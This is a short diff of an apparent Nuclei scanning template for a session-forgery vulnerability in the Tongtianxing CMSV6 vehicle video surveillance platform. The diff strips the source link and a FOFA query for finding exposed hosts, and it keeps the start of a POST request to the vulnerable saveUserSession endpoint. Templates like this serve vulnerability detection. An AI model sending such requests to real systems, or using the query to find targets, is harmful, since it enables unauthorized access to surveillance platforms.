@@ -3,12 +3,8 @@ info:
   name: 通天星CMSV6车载视频监控平台SESSION伪造漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qewtc0dxgewpm44d'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qewtc0dxgewpm44d
-    fofa: body="/808gps/"
 http:
 - raw:
   - 'POST /808gps/LocationManagement/UserSessionAction_saveUserSession.action HTTP/1.1
